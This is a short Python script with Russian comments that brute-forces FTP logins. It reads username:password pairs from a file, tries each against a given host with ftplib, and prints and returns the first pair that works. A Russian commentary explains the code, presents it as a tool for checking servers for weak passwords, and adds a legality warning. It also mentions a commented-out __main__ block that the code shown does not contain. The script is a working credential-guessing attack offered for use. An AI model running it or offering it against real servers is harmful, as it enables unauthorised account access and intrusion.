from ftplib import FTP

def ftp_bruteforce(host, credentials_file):
    """
    Выполняет брутфорс для FTP-сервера с использованием логинов и паролей из файла.
    :param host: IP-адрес или доменное имя FTP-сервера
    :param credentials_file: Путь к файлу с логинами и паролями
    """
    try:
        with open(credentials_file, "r") as file:
            credentials = file.readlines()
    except FileNotFoundError:
        print(f"Файл {credentials_file} не найден!")
        return

    for line in credentials:
        try:
            # Получаем логин и пароль из строки
            username, password = line.strip().split(":")
            # print(f"Пробуем логин: {username}, пароль: {password}")
        
            # Подключение к FTP
            ftp = FTP(host)
            ftp.login(user=username, passwd=password)
            print(f"[УСПЕХ] Логин: {username}, Пароль: {password}")
            ftp.quit()
            return f"Логин: {username}, Пароль: {password}"
        except Exception as e:
            print(f"[ОШИБКА] Логин: {username}, Пароль: {password} не подошли")
            continue

    print("Брутфорс завершён. Подходящих пар логин/пароль не найдено.")



# Этот код выполняет **брутфорс-атаку на FTP-сервер** с использованием логинов и паролей из указанного файла.

# ### Основные компоненты:
# 1. **Функция `ftp_bruteforce`**:
#    - Принимает адрес FTP-сервера (`host`) и путь к файлу с учетными данными (`credentials_file`).
#    - Читает файл с парами логин/пароль, каждая строка должна быть в формате `username:password`.

# 2. **Процесс брутфорса**:
#    - Перебирает каждую пару логин/пароль:
#      - Подключается к серверу через библиотеку `ftplib`.
#      - Пытается авторизоваться с текущими логином и паролем.
#      - Если авторизация успешна:
#        - Выводит сообщение об успехе.
#        - Завершает брутфорс.
#      - Если попытка неудачна:
#        - Сообщает об ошибке и переходит к следующей паре.
#    - Если файл с учетными данными не найден, программа выводит сообщение об ошибке и завершает работу.

# 3. **Пример использования**:
#    - Код ожидает, что файл с логинами и паролями имеет формат: `username:password` в каждой строке.
#    - Закомментированный блок `if __name__ == "__main__":` позволяет запрашивать ввод адреса сервера и пути к файлу.

# ### Особенности:
# - **Удобство**: Легко настроить через параметры функции.
# - **Обработка ошибок**:
#   - Пропускает некорректные попытки подключения.
#   - Предупреждает, если файл с учетными данными отсутствует.
# - **Целевая аудитория**: Скрипт полезен для тестирования безопасности FTP-серверов (например, проверки слабых паролей).

# ### Важно:
# Использование этого кода без разрешения администратора сервера является незаконным и нарушает правила этического хакерства.